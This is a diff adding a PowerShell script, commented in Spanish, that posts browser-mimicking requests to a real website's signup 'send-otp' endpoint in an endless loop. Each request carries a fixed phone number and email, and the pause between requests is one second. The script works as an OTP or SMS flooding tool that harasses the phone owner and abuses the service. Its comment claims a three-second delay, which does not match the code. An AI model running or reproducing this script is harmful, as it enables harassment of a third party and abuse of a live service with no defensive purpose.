@@ -1,0 +1,47 @@
+# Configuración del WebSession (se crea una vez fuera del ciclo)
+$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36"
+
+# Bucle infinito que ejecuta el script cada 3 segundos
+while ($true) {
+    try {
+        # Realiza la solicitud POST al servidor
+        Invoke-WebRequest -UseBasicParsing -Uri "https://app.nazeel.net:4443/api/Signup/send-otp" `
+            -Method "POST" `
+            -WebSession $session `
+            -Headers @{
+                "authority" = "app.nazeel.net:4443"
+                "method" = "POST"
+                "path" = "/api/Signup/send-otp"
+                "scheme" = "https"
+                "accept" = "application/json, text/plain, */*"
+                "accept-encoding" = "gzip, deflate, br"
+                "accept-language" = "en-US"
+                "authorization" = "Bearer null"
+                "clientid" = "5226bd52-858a-3b4e-786a-8b7a62d09fdb"
+                "ngsw-bypass" = ""
+                "origin" = "https://app.nazeel.net"
+                "referer" = "https://app.nazeel.net/sign-up"
+                "sec-ch-ua" = '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"'
+                "sec-ch-ua-mobile" = "?0"
+                "sec-ch-ua-platform" = '"Windows"'
+                "sec-fetch-dest" = "empty"
+                "sec-fetch-mode" = "cors"
+                "sec-fetch-site" = "same-site"
+                "selectedproperty" = ""
+                "usercurrentdatetime" = "2025-11-11 00:21"
+            } `
+            -ContentType "application/json" `
+            -Body '{"mobileNumber":"61091261","dialCode":"+378","language":"en","email":"riasdcasdas@gmail.com","uid":"3fbecd5c-cb61-af3c-700e-f437d901abb8"}'
+
+        # Mensaje de éxito
+        Write-Host "Solicitud enviada exitosamente. Próxima en 3 segundos..."
+    }
+    catch {
+        # Manejo de errores (opcional)
+        Write-Error "Ocurrió un error: $_"
+    }
+
+    # Espera 3 segundos antes de la próxima ejecución
+    Start-Sleep -Seconds 1
+}
